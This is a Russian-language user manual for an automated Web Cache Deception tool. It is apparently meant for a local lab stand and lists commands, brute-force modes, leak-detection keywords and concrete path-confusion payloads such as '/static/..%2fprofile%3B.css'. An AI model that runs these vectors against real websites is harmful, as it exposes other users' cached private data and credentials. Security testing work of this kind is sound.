╔═══════════════════════════════════════════════════════════════╗
║         WCD GUN v10.8 — РУКОВОДСТВО ПОЛЬЗОВАТЕЛЯ            ║
║              Web Cache Deception Automated Cannon            ║
╚═══════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════
 1. НАЗНАЧЕНИЕ
═══════════════════════════════════════════════════════════════

WCD Gun — интерактивный инструмент для автоматизированного обнаружения
и эксплуатации уязвимости Web Cache Deception (WCD). 
Работает как в ручном режиме, так и в связке с WCD Launcher.

Основные возможности v10.8:
  - Одиночные выстрелы (single / combo)
  - Массовый перебор (burst / fire) с прерыванием по Ctrl+C
  - Умный детектор кэша (6 уровней уверенности)
  - Сравнение тел ответов на утечку чувствительных данных
  - Подтверждение статуса кэша повторными запросами
  - Поддержка проксирования (Burp Suite)
  - Просмотр обойм (magazines) и хитов (hits) без выхода
  - Просмотр активных процессов (ps)
  - Прямые curl-запросы (raw) — обход автоматики
  - Логирование успешных векторов
  - Управление обоймами (разделители, расширения, static dirs, эндпоинты)
  - Единая функция сборки пути (build_path) для всех режимов атаки
  - Двойной Ctrl+C для гарантированного выхода из интерактивного режима
  - Корректная работа с пустыми обоймами расширений (none.extensions)

═══════════════════════════════════════════════════════════════
 2. БЫСТРЫЙ СТАРТ
═══════════════════════════════════════════════════════════════

   chmod +x wcd_gun.sh
   ./wcd_gun.sh
   
При первом запуске создаются каталоги magazines/ и reports/,
а также дефолтные обоймы. Сразу виден баннер, конфигурация
и шпаргалка команд.

Для атаки на готовый стенд:

   wcd> set target http://127.0.0.1:8080
   wcd> set cookie "session=abc123"
   wcd> profile          ← профилирование кэша
   wcd> burst            ← тотальный перебор

Или из лаунчера:

   wcd-launcher > gun

Пулемёт получит цель автоматически.

═══════════════════════════════════════════════════════════════
 3. КОМАНДЫ
═══════════════════════════════════════════════════════════════

── НАСТРОЙКА ─────────────────────────────────────────────────

  start               — мастер первоначальной настройки обойм
  set target <URL>    — задать цель (http://host:port)
  set cookie <строка> — установить cookie для прогрева кэша
  proxy on|off|status — проксирование через Burp (127.0.0.1:8082)

── РАЗВЕДКА ──────────────────────────────────────────────────

  target              — проверить доступность цели, показать кэш-заголовки
  cookie              — проверить валидность куки
  profile [URL]       — профилирование кэша (с кукой / без куки, сравнение тел)

── АТАКА ─────────────────────────────────────────────────────

  single <путь>       — одиночный выстрел.
                        Прогрев с кукой → проверка без куки.
                        Пример: single /profile%3b.css
                        Можно полный URL: single http://target/foo%3b.css

  combo <sdir> <d> <e> <ep>
                       — ручная сборка вектора.
                        sdir = static directory ("" — без неё)
                        d    = разделитель (;, %3B, ?, #)
                        e    = расширение (.css, %2ecss, .js)
                        ep   = endpoint (profile, api%2fkeys)
                        Пример: combo /images %3B .css profile
                        → /images/../profile%3B.css
                        Пример без staticdir: combo "" %3B .css profile
                        → /profile%3B.css

  burst               — полный перебор (static dirs × разделители ×
                        расширения × эндпоинты). Можно прервать Ctrl+C.
                        Работает с пустыми обоймами расширений (none.extensions).

  fire                — быстрый перебор (разделители × расширения × эндпоинты).
                        Не требует static dirs. Использует эндпоинты из обоймы.
                        Можно прервать Ctrl+C.

  raw <аргументы> <URL>
                       — прямой curl-запрос в обход автоматики.
                        Прокси учитывается (если включен).
                        Пример: raw -s -o /dev/null -D - http://127.0.0.1:8080/profile
                        Пример: raw -X POST -d "user=admin" http://target/login
                        ВАЖНО: URL всегда последний аргумент.

── УПРАВЛЕНИЕ ОБОЙМАМИ ────────────────────────────────────────

  load <тип> <имя>    — загрузить обойму.
                        Типы: delimiters, extensions, staticdir, endpoints
                        Пример: load delimiters normalization

  add <разделитель>   — добавить разделитель в текущую обойму.
                        Пример: add %0A

  magazines           — показать все обоймы в магазине

── ИНФОРМАЦИЯ ────────────────────────────────────────────────

  show                — показать цель, прокси, текущие обоймы
  hits                — показать успешные хиты (из successful_vectors.log)
  ps                  — показать активные процессы (wcd, flask, nginx)
  help                — полная справка
  quit / exit         — выход (также: двойной Ctrl+C)

═══════════════════════════════════════════════════════════════
 4. ДЕТЕКТОР КЭША (6 уровней уверенности)
═══════════════════════════════════════════════════════════════

  HIT_STRONG  [✓✓]  — явный HIT + Age > 0. Уверенность 95%.
  HIT_WEAK    [✓]   — HIT без Age, либо Age без HIT. 40-65%.
  MISS_STRONG [✗]   — явный MISS. Уверенность 90%.
  MISS_WEAK   [?]   — есть кэш-заголовки, статус не ясен. 30%.
  DYNAMIC     [~]   — Cache-Control: no-cache/private/must-revalidate. 90%.
  UNKNOWN     [ ]   — нет кэш-заголовков.

Успех = HIT_STRONG или HIT_WEAK.

═══════════════════════════════════════════════════════════════
 5. СРАВНЕНИЕ ТЕЛ ОТВЕТОВ
═══════════════════════════════════════════════════════════════

Для single/combo сравниваются тело "прогрева" (с кукой) и "проверки" (без):

  - Разница в длине ≤ 10% → длины СОВПАДАЮТ
  - Наличие маркеров: email, @, profile, account, dashboard, admin,
    token, session, api, secret, password, credit, card

Совпадение длин + маркеры = "ВЕРОЯТНАЯ УТЕЧКА!"

═══════════════════════════════════════════════════════════════
 6. ОБОЙМЫ (MAGAZINES)
═══════════════════════════════════════════════════════════════

Файлы в magazines/. Строки — элементы. Пустые и #comment игнорируются.

Типы:
  *.delimiters  — ;  %3B  ?  #  %23  %3F  %0A
  *.extensions  — .css  .js  .jpg  %2ecss  %2ejs
  *.staticdir   — /static  /images  /assets  /static/..%2f
  *.endpoints   — profile  account  admin  api%2fkeys

Встроенные обоймы:
  default.*          — базовые наборы
  encoded.delimiters — только URL-encoded разделители
  none.extensions    — пустой файл расширений (для атак без фиктивного расширения)

Свои обоймы:
  normalization.*    — для Normalization Discrepancy (создаются вручную)

Особенности v10.8:
  - burst и fire корректно работают с пустой обоймой расширений
  - Если обойма extensions пуста — перебор идёт без расширения
  - Все пути собираются через build_path() с очисткой двойных слешей

═══════════════════════════════════════════════════════════════
 7. КОМАНДА RAW — ПРЯМЫЕ ЗАПРОСЫ
═══════════════════════════════════════════════════════════════

Команда raw позволяет делать произвольные curl-запросы прямо из пулемёта,
минуя всю автоматику (обоймы, детектор кэша, сравнение тел).

Синтаксис:
   raw [curl-флаги] <URL>

   URL всегда указывается последним.
   Если прокси включен — запрос идёт через него.
   Если выключен — напрямую.

Примеры:
   wcd> raw -s -o /dev/null -D - http://127.0.0.1:8080/profile
        → вывести заголовки ответа

   wcd> raw -s http://127.0.0.1:8080/profile | grep -i api
        → поиск API-ключей в теле ответа

   wcd> raw -X POST -d "user=test" -H "Content-Type: application/json" http://target/api/login
        → POST-запрос с телом

   wcd> raw -s -o response_body.txt http://target/profile
        → сохранить тело ответа в файл

Зачем нужен:
   - Быстрая проверка гипотез без выхода из пулемёта
   - Ручная верификация подозрительного поведения
   - Отладка (проверить, что реально возвращает сервер)
   - Запросы, которые не вписываются в single/combo/burst/fire

═══════════════════════════════════════════════════════════════
 8. NORMALIZATION DISCREPANCY (новая техника)
═══════════════════════════════════════════════════════════════

Расхождение нормализации между кэшем и бэкендом.

Суть: кэш видит /static/..%2fprofile%3B.css как static-файл (префикс /static),
бэкенд декодирует %2f → /, обрабатывает ../ → /profile;.css — отдаёт профиль.

Обоймы normalization.* содержат:
  staticdir:  /static/..%2f, /images/..%252f, ..%2f (без static dir)
  delimiters: ;, %3B, ?, %3F
  extensions: .css, %2ecss, .js, %2ejs
  endpoints:  profile, account, api%2fkeys

Загрузка:
   wcd> load staticdir normalization
   wcd> load delimiters normalization
   wcd> load extensions normalization
   wcd> load endpoints normalization
   wcd> burst

═══════════════════════════════════════════════════════════════
 9. ИНТЕГРАЦИЯ С WCD LAUNCHER
═══════════════════════════════════════════════════════════════

Лаунчер (wcd_framework.sh) поднимает стенд Flask + Nginx в RAM.
Команда "gun" запускает пулемёт с целью http://127.0.0.1:8080/profile.

Ctrl+C × 2 в пулемёте → выход из пулемёта, возврат в меню лаунчера,
стенд остаётся жив.

═══════════════════════════════════════════════════════════════
10. CTRL+C — ПРЕРЫВАНИЕ ОПЕРАЦИЙ И ВЫХОД
═══════════════════════════════════════════════════════════════

  - Первый Ctrl+C в меню:
    → "Действие прервано (повторный Ctrl+C для выхода)."
    → возврат к приглашению wcd>

  - Второй Ctrl+C в меню:
    → "Повторный Ctrl+C — выход."
    → скрипт завершается

  - Во время burst/fire:
    → Первый Ctrl+C останавливает перебор, возвращает в меню
    → Хиты, найденные до прерывания, сохраняются в successful_vectors.log
    → Команда hits покажет всё что найдено

  - Флаги INTERRUPTED и SHOULD_QUIT сбрасываются после каждой операции

═══════════════════════════════════════════════════════════════
11. ПРОКСИРОВАНИЕ (Burp Suite)
═══════════════════════════════════════════════════════════════

   wcd> proxy on          — включить (Burp должен быть запущен)
   wcd> proxy off         — выключить
   wcd> proxy status      — текущий статус

По умолчанию: 127.0.0.1:8082
Изменить: export BURP_HOST=... BURP_PORT=...

Команда raw также учитывает состояние прокси.

═══════════════════════════════════════════════════════════════
12. ФАЙЛЫ И ЛОГИ
═══════════════════════════════════════════════════════════════

  wcd_gun.log                — общий лог
  successful_vectors.log     — только успешные хиты
  cookies.txt                — кука
  magazines/                 — обоймы
  reports/                   — отчёты

═══════════════════════════════════════════════════════════════
13. ПРИМЕРЫ
═══════════════════════════════════════════════════════════════

Ручной выстрел:
   wcd> single /static/..%2fprofile%3B.css

Нормализация через combo:
   wcd> combo /static/..%2f %3B .css profile

Combo без static директории:
   wcd> combo "" %3B .css profile

Быстрая разведка:
   wcd> fire

Полный перебор:
   wcd> burst
   ... ждём или Ctrl+C ...
   wcd> hits

Прямой запрос (обход автоматики):
   wcd> raw -s -D - http://127.0.0.1:8080/profile

Прямой запрос с сохранением тела:
   wcd> raw -s -o /tmp/body.txt http://target/api/keys
   wcd> raw cat /tmp/body.txt

Свои обоймы:
   wcd> load delimiters my_custom
   wcd> burst

Атака без расширений:
   wcd> load extensions none
   wcd> fire

Полный цикл:
   wcd> set target http://127.0.0.1:8080
   wcd> set cookie "session=abc123"
   wcd> profile
   wcd> load delimiters normalization
   wcd> load staticdir normalization
   wcd> load extensions normalization
   wcd> load endpoints normalization
   wcd> burst
   wcd> hits
   wcd> quit

═══════════════════════════════════════════════════════════════
14. УСТРАНЕНИЕ НЕИСПРАВНОСТЕЙ
═══════════════════════════════════════════════════════════════

"Нет ответа от ..."
  → проверь цель: target
  → стенд запущен? ps
  → выключи прокси если Burp не запущен: proxy off

HTTP 000 на все запросы
  → прокси включен, но Burp не слушает порт
  → решение: proxy off
  → или запусти Burp на 127.0.0.1:8082

"Комбинаций: 0"
  → обоймы не загружены — проверь: show
  → обоймы не скопировались в RAM — перезапусти лаунчер
  → загрузи дефолтные: start → y

Пулемёт вылетает при запуске
  → проверь версию в баннере (должна быть 10.8)
  → chmod +x wcd_gun.sh
  → VERBOSE=true ./wcd_gun.sh

Все ответы MISS
  → проверь режим стенда: в лаунчере должен быть vuln
  → profile — посмотри кэш-заголовки
  → кэш протух — увеличь sleep в single_shot

Ctrl+C не работает для выхода
  → нажми второй раз (v10.8: двойной Ctrl+C)
  → или введи quit

Не работает команда raw
  → проверь синтаксис: URL всегда последний
  → правильно: raw -s -D - http://target/path
  → неправильно: raw http://target/path -s -D -

Пустые обоймы расширений ломают burst
  → исправлено в v10.8 — пустые обоймы = 1 пустой элемент

═══════════════════════════════════════════════════════════════
15. ИСТОРИЯ ВЕРСИЙ
═══════════════════════════════════════════════════════════════

  v10.5 — graceful Ctrl+C, magazines, hits, ps, INTERRUPTED flag
  v10.6 — fire использует эндпоинты, burst с пустыми расширениями,
          build_path(), combo чистит //
  v10.7 — команда raw для прямых curl-запросов
  v10.8 — двойной Ctrl+C для выхода, SHOULD_QUIT, сброс флагов

═══════════════════════════════════════════════════════════════
                  Версия документа: 10.8 / Апрель 2026
═══════════════════════════════════════════════════════════════